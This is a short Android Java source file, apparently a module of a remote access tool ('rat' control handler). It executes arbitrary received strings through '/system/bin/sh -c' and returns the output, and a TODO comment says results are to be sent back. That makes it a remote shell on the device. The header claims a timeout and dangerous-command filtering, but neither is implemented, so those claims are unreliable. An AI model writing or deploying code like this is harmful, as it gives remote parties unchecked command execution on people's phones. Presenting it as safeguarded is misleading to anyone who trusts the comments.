package com.vendor.rat.control.handler;

import android.util.Log;

import com.google.gson.JsonObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * Shell 命令处理器 (模块 06)
 *
 * 约束:
 *   - 超时: 30 秒
 *   - 输出限制: 64KB
 *   - 危险命令过滤
 */
public class ShellCommandHandler {

    private static final String TAG = "ShellCommandHandler";
    private static final long TIMEOUT_MS = 30_000;
    private static final int MAX_OUTPUT_SIZE = 64 * 1024;

    public void handle(JsonObject command) {
        Log.d(TAG, "Shell command received");
        // TODO: 解析命令 → Runtime.exec() → 回传结果
    }

    /**
     * 执行 Shell 命令
     */
    public String executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(
                new String[]{"/system/bin/sh", "-c", command}
            );

            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null
                    && output.length() < MAX_OUTPUT_SIZE) {
                output.append(line).append("\n");
            }

            process.waitFor();
            return output.toString();

        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
